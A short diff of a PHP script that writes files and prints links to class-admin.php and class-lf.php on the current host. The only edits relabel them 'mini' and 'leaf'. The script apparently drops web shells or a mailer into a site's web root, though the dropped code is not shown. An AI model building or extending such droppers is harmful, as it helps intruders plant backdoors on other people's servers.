@@ -59,7 +59,7 @@ fwrite($open5, $text5);
 fclose($open5);
 if(file_exists($check5)){
 }
-echo " Stored he : <a href=\"http://".$_SERVER['HTTP_HOST']."/class-admin.php\">".$_SERVER['HTTP_HOST']."/class-admin.php  </a>\n<br>";
+echo " Stored mini : <a href=\"http://".$_SERVER['HTTP_HOST']."/class-admin.php\">".$_SERVER['HTTP_HOST']."/class-admin.php  </a>\n<br>";
 
 
 
@@ -70,7 +70,7 @@ fwrite($open6, $text6);
 fclose($open6);
 if(file_exists($check6)){
 }
-echo " Stored he : <a href=\"http://".$_SERVER['HTTP_HOST']."/class-lf.php\">".$_SERVER['HTTP_HOST']."/class-lf.php  </a>\n<br>";
+echo " Stored leaf : <a href=\"http://".$_SERVER['HTTP_HOST']."/class-lf.php\">".$_SERVER['HTTP_HOST']."/class-lf.php  </a>\n<br>";
 
 ?>
 
